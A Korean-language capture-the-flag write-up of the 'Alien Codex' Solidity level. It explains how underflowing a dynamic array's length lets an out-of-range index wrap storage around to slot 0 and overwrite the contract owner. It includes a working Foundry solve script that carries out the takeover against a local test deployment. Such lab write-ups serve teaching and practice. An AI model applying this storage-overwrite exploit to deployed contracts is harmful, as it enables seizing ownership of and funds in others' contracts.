# 지문

당신은 외계인(Alien) 컨트랙트를 발견했습니다. 이 컨트랙트의 소유권을 주장해서(level을) 완료하세요.

도움이 될 수 있는 것들:

배열 저장 방식(storage)이 어떻게 동작하는지 이해하기

ABI 규격(ABI specifications)에 대한 이해

매우 교묘한(underhanded) 접근 방식 사용하기

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

# 풀이 

Owner 권한을 가져오는 것이 해당 문제의 목표다.

Ownable.sol을 보면 slot0에 해당하는 곳에 owner address가 존재한다.

그곳을 overwrite해야하는 미션이다.

일단 contacted modifier의 조건에 맞게 make_contract 함수를 한번 실행시켜준다.

문제 코드에 언급된 codex가 storage layout에 어떤형태로 저장되는지 체크해보자면...

slot number가 keccak256(slot number) + codex index에 저장된다.

slot number은 32바이트를 넘길 수 없게끔 되어있다. 따라서 이 slot number에서 overflow 또는 underflow를 유도해서 slot1에 해당하는 storage 변수에 index에 음수를 넣어서 접근하지 못하더라도 slot0에 해당하는 변수의 값을 수정할 수 있다

2**256-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6에 해당하는 값을 index로 넣게되면 slot 2**256에 해당하는 곳에 값을 쓸 수가 있는데 overflow로 인해서 slot 0으로 인식된다.

이 행위를 하기 전에 retract()함수를 한번 실행시켜서 codex.length도 underflow나게 해야 revise함수를 실행시킴에도 문제가 없다 (length를 초과하는 access는 revert남. real world에서 이런 취약점이 발생할 가능성은 0에 수렴하긴함)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function owner() external view returns (address);
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}
contract SolveScript is Script {
    address public target = 0xDC17C27Ae8bE831AF07CC38C02930007060020F4;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        console.log("owner : %s", ITarget(target).owner());
        ITarget(target).makeContact();
        ITarget(target).retract();
        ITarget(target).revise(uint256(0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a), bytes32(uint256(uint160(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC))));

        console.log("owner after poc: %s", ITarget(target).owner());
        vm.stopBroadcast();
    }
}

```